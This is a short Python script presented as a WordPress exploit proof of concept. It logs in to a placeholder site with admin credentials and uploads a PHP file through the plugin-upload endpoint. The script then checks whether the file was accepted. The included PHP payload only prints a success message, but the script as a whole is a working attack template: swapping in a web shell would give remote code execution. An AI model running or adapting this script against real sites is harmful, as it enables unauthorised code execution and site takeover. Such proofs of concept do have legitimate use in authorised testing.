import requests
from requests.exceptions import RequestException

# Configuration
wordpress_url = "http://target-wordpress-site.com"  # Replace with the target WordPress site
username = "admin"  # Replace with admin username
password = "password123"  # Replace with admin password

# PHP payload
payload = """<?php
echo "Proof of Concept Exploit Successful!";
?>"""

# File to upload
php_file = {
    'file': ('poc.php', payload, 'application/x-php')
}

# Endpoints
login_endpoint = f"{wordpress_url}/wp-login.php"
upload_endpoint = f"{wordpress_url}/wp-admin/update.php?action=upload-plugin"

# Step 1: Login to WordPress
def login_to_wordpress():
    session = requests.Session()
    login_data = {
        'log': username,
        'pwd': password,
        'wp-submit': 'Log In',
        'redirect_to': f"{wordpress_url}/wp-admin/",
        'testcookie': '1'
    }
    
    try:
        response = session.post(login_endpoint, data=login_data)
        if "dashboard" in response.text:
            print("[+] Login successful")
        else:
            print("[-] Login failed")
            exit()
    except RequestException as e:
        print(f"[-] Error during login: {e}")
        exit()
    
    return session

# Step 2: Upload the PHP file
def upload_php_file(session):
    try:
        response = session.post(upload_endpoint, files=php_file)
        if response.status_code == 200 and "uploaded successfully" in response.text.lower():
            print("[+] PHP file uploaded successfully")
            print("[!] Check if the payload executed")
        else:
            print("[-] Upload failed")
            print(response.text)
    except RequestException as e:
        print(f"[-] Error during file upload: {e}")

# Main script execution
if __name__ == "__main__":
    print("[*] Starting WordPress exploit PoC")
    session = login_to_wordpress()
    upload_php_file(session)
